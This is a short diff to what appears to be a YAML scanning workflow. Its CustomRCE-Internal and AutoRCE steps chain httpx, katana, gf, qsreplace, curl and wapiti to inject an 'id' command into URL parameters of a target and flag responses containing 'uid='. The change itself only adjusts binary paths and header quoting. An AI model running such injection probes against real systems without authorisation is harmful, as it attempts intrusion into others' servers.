@@ -14,8 +14,8 @@ steps:
   - name: CustomRCE-Internal
     command: bash
     script: |
-      ~/go/bin/httpx -u ${target//\"} | katana -H "$header" qurl | gf rce | sort -u | anew | ~/go/bin/httpx -H "$header" | qsreplace id | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "uid=" && echo "RCE VULN! %" || true'
+      httpx -u ${target//\"} | katana -H ${header//\"} qurl | gf rce | sort -u | anew | httpx -H ${header//\"} | qsreplace id | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "uid=" && echo "RCE VULN! %" || true'
   - name: AutoRCE
     command: bash
     script: |
-      ~/go/bin/httpx -u $target -o resRCE_${target//\"}.txt ; wapiti -u "$(cat resRCE_${target//\"}.txt)" -m exec -H ${header//\"}
+      httpx -u $target -o resRCE_${target//\"}.txt ; wapiti -u "$(cat resRCE_${target//\"}.txt)" -m exec -H ${header//\"}
